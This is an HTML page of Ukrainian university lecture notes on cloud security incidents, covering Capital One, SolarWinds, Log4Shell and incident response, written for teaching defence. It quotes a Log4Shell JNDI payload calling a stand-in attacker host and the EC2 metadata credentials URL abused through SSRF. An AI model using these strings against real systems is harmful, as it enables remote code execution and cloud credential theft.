@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Конспект лекції 11: Актуальні загрози та аналіз реальних інцидентів хмарної безпеки.">
+  <meta name="author" content="Кафедра ТЕІБ, Ужгородський національний університет">
+  <meta name="theme-color" content="#0ea5e9">
+  <title>Конспект лекції 11 — Безпека хмарних технологій</title>
+  <link rel="icon" type="image/svg+xml" href="../../img/favicon.svg">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/style.css">
+  <script>
+    if (localStorage.getItem('theme') === 'dark') {
+      document.documentElement.classList.add('dark');
+    }
+  </script>
+</head>
+<body>
+
+  <aside>
+    <div class="logo">
+      <div class="logo-icon">
+        <svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M17.5 19H9a7 7 0 1 1 6.71-9h1.79a4.5 4.5 0 1 1 0 9Z"/>
+          <path d="M12 13v-1a2 2 0 0 1 2-2h0a2 2 0 0 1 2 2v1"/>
+          <rect x="10" y="13" width="8" height="5" rx="1"/>
+        </svg>
+      </div>
+      <div class="logo-text">
+        Безпека<br>хмарних технологій
+        <span>онлайн-курс</span>
+      </div>
+    </div>
+
+    <nav>
+      <a href="../../index.html" class="active">
+        <span class="nav-icon"><svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path d="M4 19.5v-15A2.5 2.5 0 0 1 6.5 2H20v20H6.5a2.5 2.5 0 0 1 0-5H20"/></svg></span>
+        Лекції
+      </a>
+      <a href="../../practicals.html">
+        <span class="nav-icon"><svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg></span>
+        Семінари
+      </a>
+      <a href="../../tests.html">
+        <span class="nav-icon"><svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path d="M9 11l3 3L22 4"/><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"/></svg></span>
+        Тести
+      </a>
+      <a href="../../materials.html">
+        <span class="nav-icon"><svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"/><path d="M14 2v4a2 2 0 0 0 2 2h4"/></svg></span>
+        Матеріали
+      </a>
+    </nav>
+
+    <div class="sidebar-footer">
+      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Перемкнути тему">
+        <svg id="theme-icon" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/></svg>
+        <span id="theme-label">Темна тема</span>
+      </button>
+    </div>
+  </aside>
+
+  <main>
+    <div class="lecture-nav-top">
+      <a href="../../lecture.html?id=11" class="back-link">← Назад до лекції</a>
+      <span class="lecture-badge">Конспект</span>
+    </div>
+
+    <article class="lecture-content">
+      <h1>Лекція 11. Актуальні загрози та аналіз реальних інцидентів</h1>
+      <div class="lecture-info">
+        <span><svg viewBox="0 0 24 24" width="14" height="14" stroke="currentColor" stroke-width="2" style="vertical-align: -2px; margin-right: 4px;"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>2 год</span>
+      </div>
+
+      <section>
+        <h2>Вступ</h2>
+        <p>Теорія безпеки важлива, але найцінніші уроки приходять з аналізу реальних інцидентів. У цій лекції ми детально розберемо найгучніші випадки порушення хмарної безпеки — що пішло не так, як атакуючі досягли успіху, і головне — які уроки ми можемо винести.</p>
+
+        <p>Вивчення інцидентів не для того, щоб критикувати постраждалі організації — кожна компанія може стати жертвою. Мета — зрозуміти patterns атак та впровадити відповідні захисні заходи до того, як станемо наступною жертвою.</p>
+
+        <h3>Чому аналіз інцидентів важливий?</h3>
+        <ul>
+          <li><strong>Реальні атаки vs теоретичні:</strong> Показують, що насправді працює для атакуючих</li>
+          <li><strong>Common patterns:</strong> Більшість атак використовують схожі техніки</li>
+          <li><strong>Prioritization:</strong> Допомагає фокусуватися на реальних ризиках</li>
+          <li><strong>Justification:</strong> Аргументи для security budget та initiatives</li>
+        </ul>
+
+        <h3>Цілі лекції</h3>
+        <p>Після цієї лекції ви зможете:</p>
+        <ul>
+          <li>Описати актуальний ландшафт хмарних загроз</li>
+          <li>Аналізувати root causes реальних інцидентів</li>
+          <li>Ідентифікувати common attack patterns у хмарі</li>
+          <li>Застосовувати lessons learned для покращення захисту</li>
+        </ul>
+      </section>
+
+      <section>
+        <h2>11.1 Ландшафт хмарних загроз</h2>
+
+        <h3>CSA Top Threats to Cloud Computing</h3>
+        <p>Cloud Security Alliance регулярно публікує топ загроз. Актуальний список (2024):</p>
+
+        <ol>
+          <li><strong>Misconfiguration and Inadequate Change Control</strong>
+            <ul>
+              <li>Найпоширеніша причина інцидентів</li>
+              <li>Public S3 buckets, відкриті security groups</li>
+              <li>Default credentials, відсутня MFA</li>
+            </ul>
+          </li>
+          <li><strong>Identity and Access Management Weaknesses</strong>
+            <ul>
+              <li>Excessive permissions</li>
+              <li>Shared credentials</li>
+              <li>Lack of least privilege</li>
+            </ul>
+          </li>
+          <li><strong>Insecure Interfaces and APIs</strong>
+            <ul>
+              <li>Unauthenticated APIs</li>
+              <li>Injection vulnerabilities</li>
+              <li>Insufficient input validation</li>
+            </ul>
+          </li>
+          <li><strong>Insufficient Identity, Credential, and Access Management</strong>
+            <ul>
+              <li>Weak authentication</li>
+              <li>Credential theft</li>
+              <li>Privilege escalation</li>
+            </ul>
+          </li>
+          <li><strong>Account Hijacking</strong>
+            <ul>
+              <li>Phishing для cloud credentials</li>
+              <li>Session hijacking</li>
+              <li>Credential stuffing</li>
+            </ul>
+          </li>
+        </ol>
+
+        <h3>Attack Vectors у хмарі</h3>
+
+        <p><strong>1. Credential-based attacks</strong></p>
+        <ul>
+          <li>Phishing для cloud console credentials</li>
+          <li>Exposed API keys у code repositories</li>
+          <li>Credential stuffing з leaked databases</li>
+          <li>Insider threats</li>
+        </ul>
+
+        <p><strong>2. Misconfiguration exploitation</strong></p>
+        <ul>
+          <li>Public storage buckets</li>
+          <li>Overly permissive security groups</li>
+          <li>Default configurations</li>
+          <li>Disabled logging</li>
+        </ul>
+
+        <p><strong>3. Vulnerability exploitation</strong></p>
+        <ul>
+          <li>Unpatched systems</li>
+          <li>Zero-day vulnerabilities (Log4Shell)</li>
+          <li>Container image vulnerabilities</li>
+          <li>Third-party library vulnerabilities</li>
+        </ul>
+
+        <p><strong>4. Supply chain attacks</strong></p>
+        <ul>
+          <li>Compromised software updates (SolarWinds)</li>
+          <li>Malicious packages (npm, PyPI)</li>
+          <li>Compromised CI/CD pipelines</li>
+          <li>Third-party service compromise</li>
+        </ul>
+
+        <h3>Threat Actors</h3>
+
+        <p><strong>Nation-state actors:</strong></p>
+        <ul>
+          <li>APT groups (APT29, APT41, Lazarus)</li>
+          <li>Sophisticated, well-resourced</li>
+          <li>Long-term persistent access</li>
+          <li>Targets: Government, critical infrastructure, IP theft</li>
+        </ul>
+
+        <p><strong>Cybercriminals:</strong></p>
+        <ul>
+          <li>Ransomware groups</li>
+          <li>Financial motivation</li>
+          <li>Data theft for sale</li>
+          <li>Cryptomining</li>
+        </ul>
+
+        <p><strong>Hacktivists:</strong></p>
+        <ul>
+          <li>Ideologically motivated</li>
+          <li>Data leaks, defacement</li>
+          <li>DDoS attacks</li>
+        </ul>
+
+        <p><strong>Insiders:</strong></p>
+        <ul>
+          <li>Malicious employees</li>
+          <li>Negligent actions</li>
+          <li>Compromised credentials</li>
+        </ul>
+      </section>
+
+      <section>
+        <h2>11.2 Case Study: Capital One (2019)</h2>
+
+        <h3>Overview</h3>
+        <ul>
+          <li><strong>Дата:</strong> Березень 2019 (виявлено липень 2019)</li>
+          <li><strong>Атакуючий:</strong> Paige Thompson (колишній співробітник AWS)</li>
+          <li><strong>Вплив:</strong> 100+ мільйонів клієнтів</li>
+          <li><strong>Дані:</strong> Імена, адреси, credit scores, SSN (частково)</li>
+          <li><strong>Штраф:</strong> $80 мільйонів (OCC), $190 мільйонів (settlement)</li>
+        </ul>
+
+        <h3>Як сталася атака</h3>
+
+        <p><strong>Крок 1: Initial Access</strong></p>
+        <ul>
+          <li>Capital One використовував ModSecurity WAF на EC2</li>
+          <li>WAF був misconfigured — дозволяв SSRF (Server-Side Request Forgery)</li>
+          <li>Атакуючий надіслав crafted request через WAF</li>
+        </ul>
+
+        <p><strong>Крок 2: SSRF до Metadata Service</strong></p>
+        <ul>
+          <li>SSRF дозволив звернутися до EC2 Instance Metadata Service (IMDS)</li>
+          <li>URL: <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></li>
+          <li>Отримано temporary credentials для IAM role</li>
+        </ul>
+
+        <p><strong>Крок 3: Excessive Permissions</strong></p>
+        <ul>
+          <li>WAF EC2 instance мав IAM role з надмірними permissions</li>
+          <li>Role мав доступ до S3 buckets з customer data</li>
+          <li>Порушення принципу least privilege</li>
+        </ul>
+
+        <p><strong>Крок 4: Data Exfiltration</strong></p>
+        <ul>
+          <li>Використовуючи отримані credentials, атакуючий виконав S3 sync</li>
+          <li>Скопійовано 700+ folders з даними клієнтів</li>
+          <li>Дані завантажено на особистий сервер</li>
+        </ul>
+
+        <h3>Root Causes</h3>
+        <ol>
+          <li><strong>SSRF vulnerability:</strong> WAF не був properly configured</li>
+          <li><strong>Overprivileged IAM role:</strong> WAF role не потребував доступу до S3</li>
+          <li><strong>IMDSv1:</strong> Metadata service був доступний без токена</li>
+          <li><strong>Insufficient monitoring:</strong> Exfiltration не була виявлена вчасно</li>
+        </ol>
+
+        <h3>Lessons Learned</h3>
+        <ul>
+          <li><strong>Use IMDSv2:</strong> Потребує токен, захищає від SSRF</li>
+          <li><strong>Least privilege:</strong> IAM roles мають мати мінімальні permissions</li>
+          <li><strong>WAF configuration:</strong> Regular security review of WAF rules</li>
+          <li><strong>Monitoring:</strong> Detect unusual API calls, data access patterns</li>
+          <li><strong>Network segmentation:</strong> Обмежити доступ до metadata service</li>
+        </ul>
+      </section>
+
+      <section>
+        <h2>11.3 Case Study: SolarWinds (2020)</h2>
+
+        <h3>Overview</h3>
+        <ul>
+          <li><strong>Дата:</strong> Початок 2020 (виявлено грудень 2020)</li>
+          <li><strong>Атакуючий:</strong> APT29 (Cozy Bear, пов'язаний з Росією)</li>
+          <li><strong>Вплив:</strong> 18,000+ організацій, включаючи US government agencies</li>
+          <li><strong>Метод:</strong> Supply chain attack через SolarWinds Orion</li>
+        </ul>
+
+        <h3>Як сталася атака</h3>
+
+        <p><strong>Крок 1: Compromise SolarWinds Build System</strong></p>
+        <ul>
+          <li>Атакуючі отримали доступ до SolarWinds development environment</li>
+          <li>Модифіковано build process для Orion software</li>
+          <li>Inject malicious code (SUNBURST backdoor) у legitimate update</li>
+        </ul>
+
+        <p><strong>Крок 2: Distribution через Software Update</strong></p>
+        <ul>
+          <li>Malicious update (версія 2019.4 - 2020.2.1) підписано legitimate certificate</li>
+          <li>Розповсюджено через official SolarWinds update mechanism</li>
+          <li>Клієнти встановили "legitimate" update</li>
+        </ul>
+
+        <p><strong>Крок 3: Stealth Operation</strong></p>
+        <ul>
+          <li>SUNBURST dormant період 2 тижні перед активацією</li>
+          <li>Check для sandbox/analysis environment</li>
+          <li>Комунікація через DNS, маскована під legitimate traffic</li>
+        </ul>
+
+        <p><strong>Крок 4: Lateral Movement</strong></p>
+        <ul>
+          <li>SUNBURST завантажував додаткові tools (TEARDROP, RAINDROP)</li>
+          <li>Credential theft, lateral movement</li>
+          <li>Access до cloud environments (Microsoft 365, Azure AD)</li>
+          <li>Читання emails, documents у cloud</li>
+        </ul>
+
+        <h3>Cloud-Specific Impact</h3>
+        <ul>
+          <li><strong>Azure AD compromise:</strong> Атакуючі отримали доступ до Azure AD</li>
+          <li><strong>SAML token forgery:</strong> Golden SAML attack для persistent access</li>
+          <li><strong>Microsoft 365:</strong> Читання emails урядових чиновників</li>
+          <li><strong>Federated identity:</strong> Компрометація on-prem AD → cloud access</li>
+        </ul>
+
+        <h3>Lessons Learned</h3>
+        <ul>
+          <li><strong>Supply chain security:</strong> Verify software integrity, monitor updates</li>
+          <li><strong>Build system security:</strong> Secure CI/CD pipelines</li>
+          <li><strong>Zero trust:</strong> Не довіряти навіть "trusted" software</li>
+          <li><strong>Monitoring:</strong> Detect anomalous behavior, even from legitimate processes</li>
+          <li><strong>Identity security:</strong> Protect federated identity, SAML certificates</li>
+          <li><strong>Assume breach:</strong> Design for detection, not just prevention</li>
+        </ul>
+      </section>
+
+      <section>
+        <h2>11.4 Case Study: Log4Shell (2021)</h2>
+
+        <h3>Overview</h3>
+        <ul>
+          <li><strong>Дата:</strong> Грудень 2021</li>
+          <li><strong>Вразливість:</strong> CVE-2021-44228 (CVSS 10.0)</li>
+          <li><strong>Компонент:</strong> Apache Log4j 2 (Java logging library)</li>
+          <li><strong>Вплив:</strong> Мільйони систем worldwide, включаючи cloud services</li>
+        </ul>
+
+        <h3>Технічні деталі</h3>
+
+        <p><strong>Вразливість:</strong></p>
+        <ul>
+          <li>Log4j підтримував JNDI (Java Naming and Directory Interface) lookups</li>
+          <li>User input у log messages міг trigger JNDI lookup</li>
+          <li>Payload: <code>${jndi:ldap://attacker.com/exploit}</code></li>
+          <li>Log4j завантажував та виконував remote Java class</li>
+        </ul>
+
+        <p><strong>Attack vector:</strong></p>
+        <ol>
+          <li>Атакуючий відправляє malicious string (User-Agent, form field, etc.)</li>
+          <li>Application логує string використовуючи Log4j</li>
+          <li>Log4j парсить JNDI lookup</li>
+          <li>JNDI звертається до attacker's LDAP server</li>
+          <li>LDAP server повертає malicious Java class</li>
+          <li>Log4j завантажує та виконує code → RCE</li>
+        </ol>
+
+        <h3>Cloud Impact</h3>
+        <ul>
+          <li><strong>AWS:</strong> Багато AWS services використовували Log4j</li>
+          <li><strong>Azure:</strong> Azure services affected</li>
+          <li><strong>Widespread:</strong> Minecraft, Apple iCloud, Twitter, Steam</li>
+          <li><strong>Container images:</strong> Тисячі vulnerable images на Docker Hub</li>
+        </ul>
+
+        <h3>Response Challenges</h3>
+        <ul>
+          <li><strong>Discovery:</strong> Де саме використовується Log4j?</li>
+          <li><strong>Transitive dependencies:</strong> Log4j як dependency of dependency</li>
+          <li><strong>Patching at scale:</strong> Тисячі applications, containers</li>
+          <li><strong>WAF bypass:</strong> Обфускація payload</li>
+        </ul>
+
+        <h3>Lessons Learned</h3>
+        <ul>
+          <li><strong>Software Bill of Materials (SBOM):</strong> Know your dependencies</li>
+          <li><strong>Vulnerability scanning:</strong> Continuous scanning для libraries</li>
+          <li><strong>Defense in depth:</strong> WAF, egress filtering, segmentation</li>
+          <li><strong>Incident response:</strong> Готовність до швидкого patching</li>
+          <li><strong>Secure by default:</strong> Disable dangerous features by default</li>
+        </ul>
+      </section>
+
+      <section>
+        <h2>11.5 Інші значущі інциденти</h2>
+
+        <h3>Twitch Data Breach (2021)</h3>
+        <ul>
+          <li><strong>Вплив:</strong> 125 GB source code, creator payouts</li>
+          <li><strong>Причина:</strong> Server misconfiguration</li>
+          <li><strong>Leaked:</strong> Повний source code, internal tools, payout data</li>
+          <li><strong>Lesson:</strong> Secure internal repositories, access controls</li>
+        </ul>
+
+        <h3>Microsoft Exchange ProxyLogon (2021)</h3>
+        <ul>
+          <li><strong>Вразливості:</strong> CVE-2021-26855, CVE-2021-26857, etc.</li>
+          <li><strong>Вплив:</strong> 250,000+ Exchange servers</li>
+          <li><strong>Атакуючі:</strong> Hafnium (China-linked) та інші</li>
+          <li><strong>Lesson:</strong> Patch management, zero-trust for on-prem</li>
+        </ul>
+
+        <h3>Codecov Supply Chain Attack (2021)</h3>
+        <ul>
+          <li><strong>Метод:</strong> Compromise of Bash Uploader script</li>
+          <li><strong>Вплив:</strong> Credentials extracted from CI/CD environments</li>
+          <li><strong>Duration:</strong> 2 місяці непомічено</li>
+          <li><strong>Lesson:</strong> Verify CI/CD tools integrity, rotate credentials</li>
+        </ul>
+
+        <h3>Uber Breach (2022)</h3>
+        <ul>
+          <li><strong>Метод:</strong> Social engineering + MFA fatigue attack</li>
+          <li><strong>Access:</strong> Internal systems, Slack, cloud dashboards</li>
+          <li><strong>Attacker:</strong> 18-year-old hacker</li>
+          <li><strong>Lesson:</strong> MFA не панацея, security awareness training</li>
+        </ul>
+
+        <h3>LastPass Breach (2022-2023)</h3>
+        <ul>
+          <li><strong>Initial access:</strong> Compromised developer laptop</li>
+          <li><strong>Escalation:</strong> Access to cloud storage</li>
+          <li><strong>Impact:</strong> Encrypted password vaults stolen</li>
+          <li><strong>Lesson:</strong> Endpoint security, separation of duties</li>
+        </ul>
+
+        <h3>MOVEit Transfer (2023)</h3>
+        <ul>
+          <li><strong>Вразливість:</strong> SQL injection (CVE-2023-34362)</li>
+          <li><strong>Атакуючий:</strong> Cl0p ransomware group</li>
+          <li><strong>Вплив:</strong> 2,500+ організацій, 60+ мільйонів людей</li>
+          <li><strong>Lesson:</strong> Patch critical systems immediately, file transfer security</li>
+        </ul>
+      </section>
+
+      <section>
+        <h2>11.6 Common Patterns та Lessons</h2>
+
+        <h3>Recurring Patterns в інцидентах</h3>
+
+        <p><strong>1. Misconfiguration як entry point</strong></p>
+        <ul>
+          <li>Public S3 buckets (Capital One, Facebook)</li>
+          <li>Open security groups</li>
+          <li>Default credentials</li>
+          <li><strong>Mitigation:</strong> CSPM, configuration scanning, defaults review</li>
+        </ul>
+
+        <p><strong>2. Overprivileged identities</strong></p>
+        <ul>
+          <li>IAM roles з зайвими permissions</li>
+          <li>Service accounts з broad access</li>
+          <li>Lack of least privilege</li>
+          <li><strong>Mitigation:</strong> CIEM, regular access reviews, just-in-time access</li>
+        </ul>
+
+        <p><strong>3. Supply chain як attack vector</strong></p>
+        <ul>
+          <li>SolarWinds, Codecov, npm packages</li>
+          <li>Trust in third-party software</li>
+          <li>Build system compromise</li>
+          <li><strong>Mitigation:</strong> SBOM, integrity verification, vendor assessment</li>
+        </ul>
+
+        <p><strong>4. Credential theft та reuse</strong></p>
+        <ul>
+          <li>Phishing, credential stuffing</li>
+          <li>Exposed secrets in code</li>
+          <li>Weak MFA implementation</li>
+          <li><strong>Mitigation:</strong> Phishing-resistant MFA, secrets management, monitoring</li>
+        </ul>
+
+        <p><strong>5. Insufficient monitoring</strong></p>
+        <ul>
+          <li>Тривалий dwell time (SolarWinds: months)</li>
+          <li>Exfiltration не detected</li>
+          <li>Lack of behavioral analysis</li>
+          <li><strong>Mitigation:</strong> SIEM, UEBA, anomaly detection, threat hunting</li>
+        </ul>
+
+        <h3>Key Takeaways</h3>
+
+        <ol>
+          <li><strong>Assume breach:</strong> Design for detection та containment, не тільки prevention</li>
+          <li><strong>Defense in depth:</strong> Multiple layers of controls</li>
+          <li><strong>Least privilege:</strong> Мінімальні permissions для всіх identities</li>
+          <li><strong>Visibility:</strong> Ви не можете захистити те, що не бачите</li>
+          <li><strong>Patch management:</strong> Швидке patching критичних vulnerabilities</li>
+          <li><strong>Supply chain:</strong> Verify trust, monitor third-party components</li>
+          <li><strong>Human factor:</strong> Security awareness, phishing resistance</li>
+          <li><strong>Incident response:</strong> Prepared playbooks, regular drills</li>
+        </ol>
+      </section>
+
+      <section>
+        <h2>11.7 Incident Response у хмарі</h2>
+
+        <h3>Cloud-Specific IR Challenges</h3>
+        <ul>
+          <li><strong>Ephemeral resources:</strong> Evidence може зникнути</li>
+          <li><strong>Shared responsibility:</strong> Координація з provider</li>
+          <li><strong>Multi-account:</strong> Lateral movement між accounts</li>
+          <li><strong>API-based:</strong> Атаки через API calls</li>
+        </ul>
+
+        <h3>IR Phases в Cloud</h3>
+
+        <p><strong>1. Preparation</strong></p>
+        <ul>
+          <li>Enable comprehensive logging (CloudTrail, VPC Flow Logs)</li>
+          <li>Centralized log aggregation</li>
+          <li>IR playbooks для cloud scenarios</li>
+          <li>Cross-account IR role</li>
+        </ul>
+
+        <p><strong>2. Detection</strong></p>
+        <ul>
+          <li>GuardDuty, Security Hub, third-party SIEM</li>
+          <li>Anomaly detection для API calls</li>
+          <li>Threat intelligence integration</li>
+        </ul>
+
+        <p><strong>3. Containment</strong></p>
+        <ul>
+          <li>Isolate compromised resources (security groups)</li>
+          <li>Revoke compromised credentials</li>
+          <li>Disable compromised IAM entities</li>
+          <li>Preserve evidence (snapshots)</li>
+        </ul>
+
+        <p><strong>4. Investigation</strong></p>
+        <ul>
+          <li>CloudTrail analysis</li>
+          <li>Timeline reconstruction</li>
+          <li>Scope assessment</li>
+          <li>Root cause analysis</li>
+        </ul>
+
+        <p><strong>5. Eradication & Recovery</strong></p>
+        <ul>
+          <li>Remove malicious resources</li>
+          <li>Patch vulnerabilities</li>
+          <li>Rotate all potentially compromised credentials</li>
+          <li>Restore from clean backups</li>
+        </ul>
+
+        <p><strong>6. Lessons Learned</strong></p>
+        <ul>
+          <li>Post-incident review</li>
+          <li>Update playbooks</li>
+          <li>Implement preventive controls</li>
+          <li>Share learnings (internally, industry)</li>
+        </ul>
+      </section>
+
+      <section>
+        <h2>Висновки</h2>
+        <p>Аналіз реальних інцидентів показує, що більшість успішних атак використовують відомі техніки та експлуатують типові помилки. Ключові висновки:</p>
+
+        <ul>
+          <li><strong>Misconfiguration — #1:</strong> Більшість інцидентів пов'язані з misconfigurations</li>
+          <li><strong>Identity — критична:</strong> Compromised credentials = compromised cloud</li>
+          <li><strong>Supply chain — зростаюча загроза:</strong> Атаки на trusted software</li>
+          <li><strong>Detection gaps:</strong> Dwell time часто вимірюється місяцями</li>
+          <li><strong>Basics matter:</strong> Least privilege, patching, monitoring</li>
+          <li><strong>No one is immune:</strong> Навіть найбільші компанії стають жертвами</li>
+        </ul>
+
+        <h3>Практичні рекомендації</h3>
+        <ol>
+          <li>Впровадьте CSPM для continuous configuration monitoring</li>
+          <li>Застосуйте least privilege для всіх IAM entities</li>
+          <li>Enable IMDSv2 на всіх EC2 instances</li>
+          <li>Implement comprehensive logging та monitoring</li>
+          <li>Maintain SBOM та scan dependencies</li>
+          <li>Conduct regular IR drills</li>
+          <li>Learn from industry incidents — вони можуть статися з вами</li>
+        </ol>
+
+        <p>У фінальній лекції ми розглянемо ринок хмарної безпеки та стратегії впровадження — як побудувати комплексну програму хмарної безпеки в організації.</p>
+      </section>
+
+      <section>
+        <h2>Контрольні питання</h2>
+        <ol>
+          <li>Які три основні вектори атак у хмарних середовищах?</li>
+          <li>Що таке SSRF і як ця вразливість була використана в Capital One breach?</li>
+          <li>Як SolarWinds атака демонструє ризики supply chain?</li>
+          <li>Чому Log4Shell мав такий масштабний вплив?</li>
+          <li>Які common patterns спостерігаються в більшості cloud incidents?</li>
+          <li>Як відрізняється incident response у cloud від традиційного?</li>
+          <li>Які lessons learned є спільними для розглянутих інцидентів?</li>
+        </ol>
+      </section>
+
+      <section>
+        <h2>Додаткові матеріали</h2>
+        <ul>
+          <li><strong>CSA Top Threats:</strong> <a href="https://cloudsecurityalliance.org/research/topics/top-threats" target="_blank">cloudsecurityalliance.org/top-threats</a></li>
+          <li><strong>MITRE ATT&CK Cloud Matrix:</strong> <a href="https://attack.mitre.org/matrices/enterprise/cloud/" target="_blank">attack.mitre.org/cloud</a></li>
+          <li><strong>AWS Security Incident Response Guide:</strong> <a href="https://docs.aws.amazon.com/whitepapers/latest/aws-security-incident-response-guide/" target="_blank">docs.aws.amazon.com</a></li>
+          <li><strong>Krebs on Security:</strong> <a href="https://krebsonsecurity.com/" target="_blank">krebsonsecurity.com</a> (security news)</li>
+          <li><strong>Mandiant Threat Intelligence:</strong> <a href="https://www.mandiant.com/resources/insights" target="_blank">mandiant.com/insights</a></li>
+        </ul>
+      </section>
+
+    </article>
+
+    <div class="lecture-nav-bottom">
+      <a href="../../lecture.html?id=10" class="nav-btn">← Попередня лекція</a>
+      <a href="../../lecture.html?id=12" class="nav-btn">Наступна лекція →</a>
+    </div>
+
+    <footer id="footer"></footer>
+  </main>
+
+  <script src="../../js/main.js"></script>
+
+</body>
+</html>
